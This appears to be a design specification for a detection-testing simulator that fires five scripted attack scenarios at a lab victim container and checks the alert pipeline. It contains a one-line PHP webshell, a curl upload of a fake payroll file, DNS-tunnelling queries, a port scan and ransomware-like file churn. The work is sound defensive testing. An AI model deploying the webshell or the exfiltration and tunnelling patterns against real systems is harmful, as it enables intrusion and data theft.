# Simulation lab v1 — design

**Sub-project #8 of 9** in the IntelliFIM v1 walking-skeleton. Operator tool that fires curated attack scenarios at `victim-server` to verify the full 24-service detection pipeline (#1–#7) lights up end-to-end.

**Date:** 2026-05-22
**Author:** IntelliFIM team
**Status:** Approved — ready for implementation plan.

---

## 1. Goal

Ship a `simulator` operator tool that:
1. Fires hand-written attack scenarios against the existing `victim-server`.
2. Tails Kafka `threat.scores` after each attack and reports whether a qualifying detection arrived within a configurable timeout.
3. Exposes a single CLI: `docker compose --profile sim run --rm simulator <scenario>` (with a thin host wrapper `./scripts/run-scenario.sh`).

The master tech-stack document (`docs/superpowers/specs/2026-05-04-intellifim-tech-stack-design.md` §4.11) calls for **Docker Compose + Atomic Red Team + MITRE Caldera + tcpreplay/Scapy**. This sub-project implements the v1 walking-skeleton with hand-written Python scenarios only. Atomic Red Team, Caldera, tcpreplay, Scapy, and Windows attack scenarios are explicit v2/v3 deferrals — see §11.

## 2. Architecture

New tool `simulator`. Defined in `data-plane/docker-compose.yml` as a service with `profiles: [sim]` so `docker compose up -d` keeps the stack at 24 services in normal operation; `simulator` only materializes when explicitly invoked.

Stack:
- **Python 3.12** (matches every other reporting/orchestrator service)
- **aiokafka** (consumer-only — tails `threat.scores` for the verification step)
- **intellifim-schemas >= 0.4** (decodes `ThreatScoreUpdate`)
- **Shell tools** baked into the image: `curl`, `dnsutils` (for `dig`), `ca-certificates`. **No** `nmap` — port scan uses pure-Python `asyncio.open_connection()`.

The container is on BOTH the `victims` Docker network (to reach `victim-server` by hostname) AND the `bus` network (to reach `kafka:9092`). It bind-mounts the host's `monitored/` directory at `/victim-data` — the same host directory Wazuh agent watches via its FIM rule. This bind-mount-into-attacker shortcut is the key mechanic: file-based scenarios drop files directly without needing to compromise `victim-server` first.

Each scenario is a Python module that exports `NAME`, `DESCRIPTION`, and `run(target_host: str) -> None`. The runner imports the module by CLI name, calls `run()`, then opens an `AIOKafkaConsumer` on `threat.scores` with `auto_offset_reset=latest` and polls up to 60s for a `ThreatScoreUpdate` matching `host_id=001 AND score >= threshold` (default 30.0).

## 3. Scope (in / out)

### In v1
- 5 hand-written Python scenarios: `data-exfil`, `webshell-drop`, `port-scan`, `dns-tunnel`, `ransomware-rapid`.
- Verification step: each scenario tails `threat.scores` and exits `0` on detection, `2` on timeout.
- Single Docker image, single Compose service with `profiles: [sim]`.
- Host wrapper script `data-plane/scripts/run-scenario.sh`.
- Smoke script `data-plane/scripts/run-all-scenarios.sh` that runs all 5 sequentially.

### Out of v1 (deferred to v2/v3 — see §11)
- Atomic Red Team framework integration.
- MITRE Caldera C2 server + agents.
- `tcpreplay` + Scapy custom traffic generation.
- Windows attack scenarios (needs Windows agent — v3).
- `wazuh.auth` scenarios (PAM/sshd doesn't fire inside the containerized agent — known v1 data-plane limitation).
- Persistent attack history / replay buffer.
- Multi-host coordinated attacks (needs multi-agent — v3).
- Adversary profiles / multi-step campaigns.
- Web UI for "Run scenario" button.
- Detection-rule regression tests in CI.
- Auto-cleanup of `monitored/*` artifacts left by file-based scenarios.

## 4. Scenarios (the 5 v1 scenarios)

Each scenario lives in `data-plane/simulator/src/simulator/scenarios/<name>.py`. The module exports:
```python
NAME: str          # CLI-friendly kebab-case name (e.g. "data-exfil")
DESCRIPTION: str   # one-line summary shown by --list
def run(target_host: str) -> None: ...
```

`run()` may raise on internal failure; the runner catches the exception, prints it, and exits with code 3.

### 4.1 `data-exfil` (multi-layer chain)

Touches FIM + zeek.http + zeek.dns + zeek.conn in one scenario.

1. Write a fake "sensitive" file: `/victim-data/sensitive_2026q2_payroll.csv` (8 KB of CSV-shaped bytes). Wazuh FIM on `victim-server` watches `/data/monitored` (same host dir) and fires a `created` event.
2. `curl -X POST http://{target_host}/upload -d @<that-file>` — zeek-sensor (sharing `victim-server`'s netns) sees the HTTP POST request.
3. `dig +short suspicious-c2-test.invalid @{target_host}` — uses `victim-server` as the resolver so the lookup is visible on its netns. The `.invalid` TLD guarantees NXDOMAIN — zero real DNS leak.

### 4.2 `webshell-drop`

Touches FIM + zeek.http.

1. Write `<?php system($_GET["c"]); ?>` to `/victim-data/cmd.php`. FIM fires `created`/`modified`.
2. `curl -s "http://{target_host}/cmd.php?c=id"` — zeek.http fires.

### 4.3 `port-scan`

Touches zeek.conn only — many short-lived connections in a burst.

1. For ports 1..1024 (batches of 32 in parallel via `asyncio.gather`), open a TCP socket to `{target_host}:port` with a 0.5s timeout and immediately close. Most will fail (port closed / filtered) — that's the point; zeek-sensor sees a flurry of connection attempts.

### 4.4 `dns-tunnel`

Touches zeek.dns — burst of long random-subdomain queries.

1. For i in 0..49: `label = base32(os.urandom(20)).lower()`; `dig +short "{label}.exfil.tunnel.invalid" @{target_host}`. 50 queries with high-entropy long subdomains. `.invalid` TLD guarantees NXDOMAIN.

### 4.5 `ransomware-rapid`

Touches FIM — rapid create/truncate/delete churn.

1. For i in 0..29:
   - Write 1 KB of plaintext to `/victim-data/doc_{i}.txt`
   - Truncate `/victim-data/doc_{i}.txt` to 0 bytes
   - Delete `/victim-data/doc_{i}.txt`
2. 90 FIM events in well under 1 second.

## 5. Verification (the kafka-tail gate)

After `scenario.run()` returns, the runner:

1. Opens `AIOKafkaConsumer(topic="threat.scores", bootstrap_servers=KAFKA_BOOTSTRAP, group_id=f"intellifim-simulator-{uuid4()}", auto_offset_reset="latest", enable_auto_commit=False)`.
2. Polls in a loop for up to `timeout_seconds` (default 60).
3. For each message: decode bytes → `intellifim_schemas.ThreatScoreUpdate.model_validate_json(...)`. On `ValidationError` / `JSONDecodeError`, log WARN and skip.
4. Match condition: `update.host_id == HOST_ID AND update.score >= threshold`. First match wins.
5. On match: print `✓ DETECTED score={X} delta={Y} reason={...}` and exit 0.
6. On timeout: print `✗ NO DETECTION within {N}s` and exit 2.

The unique per-invocation `group_id` ensures the consumer doesn't share an offset with a stale prior run. `auto_offset_reset="latest"` means we ONLY see post-attack messages.

The `--threshold` CLI flag (default 30.0) and `--timeout` flag (default 60) override the env defaults.

## 6. HTTP / network interactions

Nothing exposed by `simulator`. It's a pure outbound client:
- Outbound to `victim-server:80` (HTTP — for `data-exfil` and `webshell-drop`)
- Outbound to `victim-server:53` (DNS — for `data-exfil` and `dns-tunnel`)
- Outbound TCP connect attempts to `victim-server:1..1024` (`port-scan`)
- Outbound to `kafka:9092` (verification tail)

No JWT, no auth, no admin-console wiring. The simulator does not talk to the orchestrator, the reporting service, or the auth-backend. It only generates traffic and reads `threat.scores`.

## 7. CLI

```
$ docker compose --profile sim run --rm simulator --help
usage: simulator [-h] [--threshold N] [--timeout S] [--list] [scenario]

Fire an attack scenario at victim-server and verify it produces a threat score.

positional arguments:
  scenario              one of: data-exfil, webshell-drop, port-scan,
                        dns-tunnel, ransomware-rapid

options:
  --list                list available scenarios and exit
  --threshold N         minimum score to count as detection (default: 30.0)
  --timeout S           seconds to wait for a threat.scores message (default: 60)
```

### Exit codes
- `0` — scenario ran and a `threat.scores` update with `score >= threshold` for `host_id=HOST_ID` arrived within timeout
- `1` — bad CLI args / unknown scenario
- `2` — scenario ran but no qualifying detection within timeout
- `3` — scenario raised during attack execution
- `4` — Kafka unreachable

### Host wrapper

`data-plane/scripts/run-scenario.sh`:
```bash
#!/usr/bin/env bash
set -euo pipefail
exec docker compose --profile sim run --rm simulator "$@"
```

### Run-all wrapper

`data-plane/scripts/run-all-scenarios.sh`:
```bash
#!/usr/bin/env bash
set -uo pipefail
SCENARIOS=(data-exfil webshell-drop port-scan dns-tunnel ransomware-rapid)
PASS=()
FAIL=()
for s in "${SCENARIOS[@]}"; do
  echo "=== $s ==="
  if ./scripts/run-scenario.sh "$s"; then
    PASS+=("$s")
  else
    FAIL+=("$s")
  fi
  echo ""
  sleep 5
done
echo "PASS (${#PASS[@]}/${#SCENARIOS[@]}): ${PASS[*]}"
echo "FAIL (${#FAIL[@]}/${#SCENARIOS[@]}): ${FAIL[*]}"
[ ${#FAIL[@]} -eq 0 ]
```

## 8. Schemas & Storage

**No new schemas.** Simulator is a consumer-only of `intellifim_schemas.ThreatScoreUpdate` (no new types, no schema bump).

**No new SQLite, no new persistent storage.** The runner is fire-and-exit — every invocation is stateless. The `--rm` flag removes the container after exit.

**Filesystem side effects:** scenarios that drop files (`data-exfil`, `webshell-drop`, `ransomware-rapid`) leave artifacts in `monitored/`. Documented in the simulator README:
```bash
# After running scenarios, clean up:
rm -rf monitored/sensitive_* monitored/cmd.php monitored/doc_*
# (or just blow it all away)
sudo rm -rf monitored/* 2>/dev/null || true
```

## 9. Service Composition

### 9.1 New Compose service block (in `data-plane/docker-compose.yml`)

```yaml
  simulator:
    profiles: [sim]                         # NOT started by `up -d`
    build:
      context: .                            # data-plane/ — one level above simulator/
      dockerfile: simulator/Dockerfile
    image: intellifim-simulator:dev
    container_name: simulator
    networks: [victims, bus]
    depends_on:
      kafka:
        condition: service_healthy
    environment:
      KAFKA_BOOTSTRAP: "kafka:9092"
      TARGET_HOST: "victim-server"
      TOPIC: "threat.scores"
      HOST_ID: "001"
      THRESHOLD_SCORE: "30.0"
      TIMEOUT_SECONDS: "60"
    volumes:
      - ${FIM_MONITORED_HOST_DIR:-./monitored}:/victim-data
```

### 9.2 Stack count

- Normal operation (`docker compose up -d`): **24 services** (unchanged from #7).
- Active scenario (`docker compose --profile sim run --rm simulator <name>`): 25 transiently, drops back to 24 when scenario exits.

### 9.3 No other compose changes

- No new volume (simulator is stateless; the only mount is the existing `monitored/` host dir).
- No admin-console changes.
- No env-var additions to `.env.dataplane.example`.

## 10. Repo Layout

```
data-plane/simulator/                       ← NEW package
├── pyproject.toml
├── Dockerfile
├── .dockerignore
├── README.md
├── src/simulator/
│   ├── __init__.py                         (empty)
│   ├── __main__.py                         (CLI entry — argparse + dispatch)
│   ├── runner.py                           (run_and_verify(name, target, threshold, timeout))
│   ├── kafka_tail.py                       (wait_for_match wrapper)
│   └── scenarios/
│       ├── __init__.py                     (SCENARIOS dict: name → module)
│       ├── data_exfil.py
│       ├── webshell_drop.py
│       ├── port_scan.py
│       ├── dns_tunnel.py
│       └── ransomware_rapid.py
└── tests/
    ├── __init__.py
    ├── conftest.py
    ├── test_scenarios.py                   (~5 tests)
    ├── test_runner.py                      (~3 tests)
    └── test_kafka_tail.py                  (~2 tests)

data-plane/scripts/
├── run-scenario.sh                         (NEW; thin wrapper)
└── run-all-scenarios.sh                    (NEW; sequential runner)

# Modified
data-plane/docker-compose.yml               (add `simulator` service block)
data-plane/README.md                        (add simulator + scenarios bullets)
```

### Dockerfile (follows orchestrator's context-at-`data-plane/` pattern)

```dockerfile
# data-plane/simulator/Dockerfile
# Build context must be data-plane/ (one level up) so we can COPY both
# schemas/ and simulator/.
FROM python:3.12-slim AS base

ENV PYTHONDONTWRITEBYTECODE=1 \
    PYTHONUNBUFFERED=1 \
    PIP_NO_CACHE_DIR=1

RUN apt-get update && apt-get install -y --no-install-recommends \
        curl dnsutils ca-certificates \
    && rm -rf /var/lib/apt/lists/*

WORKDIR /app

COPY schemas /app/schemas
RUN pip install /app/schemas

COPY simulator /app/simulator
RUN pip install /app/simulator

ENTRYPOINT ["intellifim-simulator"]
CMD ["--help"]
```

Note: ENTRYPOINT (not just CMD) so `docker compose --profile sim run --rm simulator <name>` passes `<name>` as the argparse positional, not the binary name.

### pyproject.toml (key dependency pins)

```toml
dependencies = [
    "aiokafka>=0.10,<0.13",
    "intellifim-schemas>=0.4,<1.0",
]

[project.optional-dependencies]
dev = [
    "pytest>=8,<9",
    "pytest-asyncio>=0.23,<0.25",
]

[project.scripts]
intellifim-simulator = "simulator.__main__:main"
```

### Branch

`feat/simulation-lab-v1` off main.

## 11. Testing

### 11.1 Unit tests (~10 new; total moves from 244 → ~254 Python + 5 Rego)

| Module | Count | Coverage |
|---|---|---|
| `tests/test_scenarios.py` | ~5 | Each scenario module exports `NAME`, `DESCRIPTION`, `run(target_host)`. Calling `run()` against `tmp_path` (as `/victim-data` mount) + a `monkeypatch` of `subprocess.run` produces the expected file artifacts AND the expected subprocess calls (`curl ... target_host ...` for HTTP scenarios; `dig ... target_host ...` for DNS scenarios; no subprocess for `port-scan` which uses `asyncio.open_connection`). |
| `tests/test_runner.py` | ~3 | `dispatch(name)` returns the right module; unknown name raises `KeyError` (caller maps to exit 1); CLI `--list` enumerates all 5 scenarios with their descriptions. |
| `tests/test_kafka_tail.py` | ~2 | Dual-mode `_extract_update(message)` (typed `ThreatScoreUpdate` fast-path + bytes-via-`FakeMessage`); `wait_for_match` returns on the FIRST matching update and skips non-matching ones (threshold + host_id filter). |

### 11.2 Test infrastructure to repeat
- `monkeypatch` of `subprocess.run` to capture invocations without actually shelling out.
- `tmp_path` as the `/victim-data` mount target.
- `FakeMessage(value=bytes)` shim for aiokafka (same pattern as reporting/consumer).
- `pytest-asyncio` with `asyncio_mode = "auto"` (configured in pyproject).
- Test fixtures keep `target_host = "test-victim"` (any string) — scenarios just pass it through.

### 11.3 Definition of Done (8 items)

1. **`pytest` green** — all new tests pass + full suite stays green: ~254 Python + 5 Rego.
2. **`docker compose up -d`** on a fresh checkout brings up exactly **24 services** healthy (simulator stays hidden behind `profiles: [sim]`).
3. **`docker compose --profile sim run --rm simulator --list`** prints all 5 scenarios with their descriptions.
4. **`docker compose --profile sim run --rm simulator --help`** prints the argparse help.
5. **Each of the 5 scenarios passes end-to-end** — for each `name` in `{data-exfil, webshell-drop, port-scan, dns-tunnel, ransomware-rapid}`, `./scripts/run-scenario.sh <name>` against the live 24-service stack exits 0 with `✓ DETECTED score=X reason=...` within 60s. Run sequentially via `./scripts/run-all-scenarios.sh`; record the score per scenario.
6. **No-detection sentinel test** (ad-hoc) — manually run an innocuous action (e.g. `curl http://victim-server/index.html` once), confirm a follow-up `run-scenario` call to the same name doesn't artificially pass; OR run `./scripts/run-scenario.sh data-exfil --threshold 999` and confirm it exits 2 within 60s. Verifies the verification gate is real, not a stub.
7. **kafka-ui spot-check** — after running `data-exfil`, open `http://localhost:8080` (kafka-ui) and verify messages landed in BOTH `events.normalized` AND `threat.scores`. Visual confirmation that the full pipeline routed correctly.
8. **Cleanup** — no leaked containers in `docker ps -a | grep simulator` (because `--rm`). `monitored/` may contain leftover scenario artifacts; documented cleanup is in the simulator README.

### 11.4 Smoke verification
`./scripts/run-all-scenarios.sh` is the single command that verifies DoD #5 end-to-end.

## 12. Error Handling & Edge Cases

| Scenario | Behavior |
|---|---|
| Unknown scenario name on CLI | exit 1 with `unknown scenario: <name>; try --list` |
| Scenario raises during `run()` | exit 3; print the exception type + message; do NOT proceed to verification |
| `curl` / `dig` not installed in image | image build fails (apt-install is part of Dockerfile) — caught at `docker build` time, not runtime |
| `port-scan` target_host unreachable | each `asyncio.open_connection` call times out at 0.5s individually; scenario completes; verification step still runs (and likely times out — that's correct behavior, no false-positive detection) |
| Kafka unreachable for verification | exit 4 with `could not reach kafka: <error>`; do NOT mark scenario as failed if its attack succeeded — distinguish "attack succeeded but verification broken" from "attack failed" |
| Malformed message on `threat.scores` topic | log WARN and skip; keep polling within timeout |
| Scenario detected, but multiple messages match | first match wins; report the first one |
| `monitored/` not writable from inside container | scenario raises `PermissionError`; exit 3. (Documented in README: `chmod 777 monitored` or run via the FIM_MONITORED_HOST_DIR env override.) |
| Scenario produces detection AFTER the timeout | exit 2 (no detection); a longer `--timeout` may fix it. Document in README: "if you see false negatives, try `--timeout 120`." |

## 13. Known v2 Follow-ups

Carried forward from v1's deliberate scope reductions. These will appear in a "From #8" block in the roadmap memory after merge.

- **Atomic Red Team integration** — bake the Atomic Red Team repo into the image; map scenarios to MITRE ATT&CK technique IDs (e.g. T1003.001, T1059.004, T1071.001). Better story for compliance reports + standardized taxonomy.
- **MITRE Caldera** — full red-team workflow with Caldera server + agents.
- **`tcpreplay` + Scapy** — packet-level custom traffic generation.
- **Windows attack scenarios** — depends on Windows agent (v3).
- **`wazuh.auth` scenarios** — depends on PAM/sshd inside agent (won't fire in containerized agent; needs real Linux host).
- **Persistent attack history** — store each scenario invocation + verification result in a small SQLite table; expose via admin-console "Past attacks" tab.
- **Multi-host coordinated attacks** — depends on multi-agent (v3).
- **Adversary profiles / scenario chains** — multi-step campaigns (e.g. "initial-access → discovery → lateral-movement → exfil").
- **Web UI** — "Run scenario" button on the admin console; live-stream the verification output.
- **Detection-rule regression tests in CI** — run all scenarios on every policy-engine or anomaly-detector change; alert if any previously-passing scenario regresses.
- **Auto-cleanup** of `monitored/*` artifacts after each scenario.
- **Scenario severity-tier labels** — annotate each scenario with the expected priority tier (HIGH/LOW); verifier checks not just score threshold but also that the right tier of approval triggered (couples with response orchestrator).
- **Score-delta + correlation-id assertions** in the verifier — currently only checks the final score; could also assert `reason` contains expected substring (e.g. "exfil" → "data-exfil" scenario).
- **Concurrency** — currently scenarios are strictly sequential because the verifier uses `auto_offset_reset=latest`. Running them in parallel would need per-scenario filter heuristics (e.g. match on `reason` substring).
- **`--dry-run`** flag — print what would happen without firing the attack. Useful for documentation.
- **Output format** — `--json` flag to print results as JSON for CI consumption (current is human-readable text).

## 14. References

- Master tech-stack design: `docs/superpowers/specs/2026-05-04-intellifim-tech-stack-design.md` (§4.11 Simulation Environment)
- Sub-project #1: data plane — `docs/superpowers/specs/2026-05-04-data-plane-v1-design.md` (defines `victim-server`, `victims` network, `monitored/` bind-mount, FIM rule)
- Sub-project #4: policy engine (produces `threat.scores` — the topic the simulator tails) — `docs/superpowers/specs/2026-05-18-policy-engine-v1-design.md`
- Sub-project #5: response orchestrator (consumes `threat.scores` → approvals — the simulator's score thresholds align with the orchestrator's tier thresholds) — `docs/superpowers/specs/2026-05-19-response-orchestrator-v1-design.md`
- Roadmap memory (canonical sub-project status): `~/.claude/projects/-home-aditya-Documents-IntelliFIM/memory/project_intellifim_roadmap.md`
